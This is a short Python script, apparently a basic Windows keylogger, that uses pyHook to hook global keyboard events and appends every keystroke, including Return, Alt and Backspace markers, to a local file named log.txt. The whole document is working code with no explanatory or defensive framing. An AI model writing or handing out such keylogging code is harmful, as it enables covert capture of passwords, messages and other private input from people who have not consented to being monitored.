import pyHook

def OnKeyboardEvent(event):
    
    if event.KeyID == 13:
        text = '[Return]'
    elif event.KeyID == 165:
        text = '[Alt]'
    elif event.KeyID == 8:
        text = '[Back]'
    else:
        text = chr(event.Ascii)
    
    fob = open('log.txt', 'a')
    fob.write(text)
    fob.close()
  
    return True

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()

if __name__ == '__main__':
  import pythoncom
  pythoncom.PumpMessages()